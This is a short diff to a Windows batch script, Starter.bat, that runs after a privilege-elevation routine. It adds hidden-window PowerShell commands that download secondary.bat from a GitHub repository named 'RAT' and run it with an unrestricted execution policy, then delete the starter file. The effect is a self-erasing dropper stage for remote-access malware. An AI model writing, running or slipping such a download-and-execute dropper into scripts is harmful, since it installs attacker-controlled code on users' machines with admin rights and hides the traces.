@@ -19,5 +19,9 @@ if '%errorlevel%' NEQ '0' (
     exit /B
 
 :gotAdmin
-    %cd%
-    del Starter.bat
+    pushd "%CD%"
+    CD /D "%~dp0"
+
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/saifnasef/RAT/main/secondary.bat -o secondary.bat"
+powershell powershell.exe -windowstyle hidden -ep unrestricted ./secondary.bat
+del Starter.bat
